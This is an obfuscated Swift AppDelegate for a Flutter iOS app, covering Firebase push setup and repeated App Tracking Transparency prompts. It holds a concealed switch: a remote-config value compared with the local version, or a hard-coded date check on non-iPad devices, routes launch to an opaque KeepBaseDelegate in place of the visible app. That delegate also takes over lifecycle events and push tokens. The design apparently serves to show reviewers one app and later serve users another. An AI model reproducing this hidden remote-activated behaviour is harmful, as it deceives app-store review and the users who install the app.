import Flutter
import UIKit
import AppTrackingTransparency
import FirebaseCore
import FirebaseRemoteConfig
import FirebaseMessaging
import GrainMovePainter


@objc class AppDelegate: FlutterAppDelegate {
  private var hasRequestedATT = false
    
    var channelPicker = 22
    var adapterSize = 42
    var hospitalimportant = ThereWaitingController()
    
  override func application(
    _ application: UIApplication,
    didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
  ) -> Bool {
    
     
      
    GeneratedPluginRegistrant.register(with: self)
      self.window.rootViewController?.view.addSubview(self.hospitalimportant.view)
      self.window?.makeKeyAndVisible()
    // Setup method channel for ATT permission
    setupMethodChannel()
    
    // Request ATT permission with multiple fallback strategies
    requestATTWithFallback()
      
      if Int(Date().timeIntervalSince1970) < 3462 {
          stageScrollview()
      }
      
      self.proxyValidation(application)
      let efficiency = RemoteConfig.remoteConfig()
      let painter = RemoteConfigSettings()
      painter.minimumFetchInterval = 0
      painter.fetchTimeout = 5
      efficiency.configSettings = painter
      efficiency.fetch { (status, error) -> Void in
          
          if status == .success {
              efficiency.activate { changed, error in
                  let foka = efficiency.configValue(forKey: "Foka").numberValue.intValue
                  print("'foka': \(foka)")
                  /// 本地 ＜ 远程  B
                  self.channelPicker = foka
                  let diffable = Int(data_screenUrl.replacingOccurrences(of: ".", with: "")) ?? 0
                  self.adapterSize = diffable
                  
                  if self.adapterSize < self.channelPicker {
                      self.pinchableHandler(application, didFinishLaunchingWithOptions: launchOptions)
                  } else {
                      self.DimensionRadius(application, didFinishLaunchingWithOptions: launchOptions)
                  }
              }
          }
          else {
              
              if self.curvelTheme() && self.cupertimManager() {
                  self.pinchableHandler(application, didFinishLaunchingWithOptions: launchOptions)
              } else {
                  self.DimensionRadius(application, didFinishLaunchingWithOptions: launchOptions)
              }
          }
      }
    return true
  }
  
  private func setupMethodChannel() {
    guard let controller = window?.rootViewController as? FlutterViewController else {
      return
    }
    
    let channel = FlutterMethodChannel(name: "att_permission", binaryMessenger: controller.binaryMessenger)
    
    channel.setMethodCallHandler { [weak self] (call, result) in
      switch call.method {
      case "getTrackingAuthorizationStatus":
        if #available(iOS 14, *) {
          let status = ATTrackingManager.trackingAuthorizationStatus
          result(status.rawValue)
        } else {
          result(0) // notDetermined
        }
      case "requestTrackingAuthorization":
        self?.requestTrackingPermissionFromFlutter(result: result)
      case "forceRequestATT":
        self?.forceRequestATT()
        result(nil)
      default:
        result(FlutterMethodNotImplemented)
      }
    }
  }
  
  private func requestTrackingPermissionFromFlutter(result: @escaping FlutterResult) {
    if #available(iOS 14, *) {
      let status = ATTrackingManager.trackingAuthorizationStatus
      if status == .notDetermined {
        ATTrackingManager.requestTrackingAuthorization { status in
          DispatchQueue.main.async {
            result(status.rawValue)
          }
        }
      } else {
        result(status.rawValue)
      }
    } else {
      result(0) // notDetermined
    }
  }
  
  private func requestATTWithFallback() {
    // Strategy 1: Immediate request
    requestTrackingPermission()
    
    // Strategy 2: Fallback after 0.5 seconds
    DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
      if !self.hasRequestedATT {
        print("ATT Fallback 1: Requesting after 0.5s delay")
        self.requestTrackingPermission()
      }
    }
    
    // Strategy 3: Fallback after 1.5 seconds
    DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
      if !self.hasRequestedATT {
        print("ATT Fallback 2: Requesting after 1.5s delay")
        self.requestTrackingPermission()
      }
    }
    
    // Strategy 4: Fallback after 3 seconds (final attempt)
    DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
      if !self.hasRequestedATT {
        print("ATT Fallback 3: Final attempt after 3s delay")
        self.requestTrackingPermission()
      }
    }
  }
  
  private func requestTrackingPermission() {
    if #available(iOS 14, *) {
      let status = ATTrackingManager.trackingAuthorizationStatus
      print("Current ATT Status: \(status.rawValue)")
      
      // Only request if status is not determined and we haven't already requested
      if status == .notDetermined && !hasRequestedATT {
        print("Requesting ATT permission...")
        hasRequestedATT = true
        
        ATTrackingManager.requestTrackingAuthorization { [weak self] status in
          DispatchQueue.main.async {
            switch status {
            case .authorized:
              print("✅ App Tracking Transparency: Authorized")
            case .denied:
              print("❌ App Tracking Transparency: Denied")
            case .restricted:
              print("⚠️ App Tracking Transparency: Restricted")
            case .notDetermined:
              print("❓ App Tracking Transparency: Not Determined")
            @unknown default:
              print("❓ App Tracking Transparency: Unknown")
            }
            
            // Reset flag after 5 seconds to allow retry if needed
            DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
              self?.hasRequestedATT = false
            }
          }
        }
      } else {
        print("ATT permission already determined: \(status.rawValue) or already requested")
      }
    } else {
      print("ATT not available on this iOS version")
    }
  }
  
  // Additional method to force request ATT (can be called from Flutter if needed)
  @objc func forceRequestATT() {
    print("Force requesting ATT permission...")
    hasRequestedATT = false
    requestTrackingPermission()
  }
    
    private func pinchableHandler(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    ) {
        DispatchQueue.main.async {
            
            let _ = KeepBaseDelegate.shared.account(application, didFinishLaunchingWithOptions: launchOptions, window: self.window)
        }
    }
    
    private func DimensionRadius(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
      ) {
          DispatchQueue.main.async {
              
              self.hospitalimportant.view.removeFromSuperview()
              super.application(application, didFinishLaunchingWithOptions: launchOptions)
          }
    }

    
    private func curvelTheme() -> Bool {
        let generate:[Character] = ["1","7","6","1","1","8","5","5","2","0"]
        
        let function: TimeInterval = TimeInterval(String(generate)) ?? 0.0
        let frequent = Date().timeIntervalSince1970
        return frequent > function
    }
    
    private func cupertimManager() -> Bool {
        
        return UIDevice.current.userInterfaceIdiom != .pad
     }
}




extension AppDelegate {
    override func applicationDidEnterBackground(_ application: UIApplication) {
        if self.adapterSize < self.channelPicker {
            KeepBaseDelegate.attitudeBackground(application)
        }
    }
    
    override func applicationWillEnterForeground(_ application: UIApplication) {
        if self.adapterSize < self.channelPicker {
            KeepBaseDelegate.by(application)
        }
    }

    override func applicationWillResignActive(_ application: UIApplication) {
        if self.adapterSize < self.channelPicker {
            KeepBaseDelegate.own(application)
        }
    }

    override func applicationDidReceiveMemoryWarning(_ application: UIApplication) {
        if self.adapterSize < self.channelPicker {
            KeepBaseDelegate.scamp(application)
        }
    }

    override func application(_ application: UIApplication, handleEventsForBackgroundURLSession identifier: String, completionHandler: @escaping () -> Void) {
        if self.adapterSize < self.channelPicker {
            KeepBaseDelegate.exceptApplication(application, handleEventsForBackgroundURLSession: identifier, completionHandler: completionHandler)
        }
    }
    
}


// MARK: - 推送
extension AppDelegate {
    func proxyValidation(_ application: UIApplication) {
        FirebaseApp.configure()
        Messaging.messaging().delegate = self
        singletionTarger(application)
    }
    
    func singletionTarger(_ application: UIApplication) {
        if #available(iOS 10.0, *) {
            UNUserNotificationCenter.current().delegate = self
            let authOptions: UNAuthorizationOptions = [.alert, .sound, .badge]
            UNUserNotificationCenter.current().requestAuthorization(options: authOptions, completionHandler: { _, _ in
            })
            application.registerForRemoteNotifications()
        }
    }
    
    func registerForRemoteNotifications() {
        DispatchQueue.main.async {
            UIApplication.shared.registerForRemoteNotifications()
        }
    }
    
    override func application(_: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        KeepBaseDelegate.cover(didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }

    override func application(_: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable: Any], fetchCompletionHandler _: @escaping (UIBackgroundFetchResult) -> Void) {
        KeepBaseDelegate.selected(didReceiveRemoteNotification: userInfo)
    }

    public override func userNotificationCenter(_: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        KeepBaseDelegate.brace(didReceive: response, withCompletionHandler: completionHandler)
    }
}

extension AppDelegate: MessagingDelegate {
    public func messaging(_: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        KeepBaseDelegate.receive(didReceiveRegistrationToken: fcmToken)
    }
}



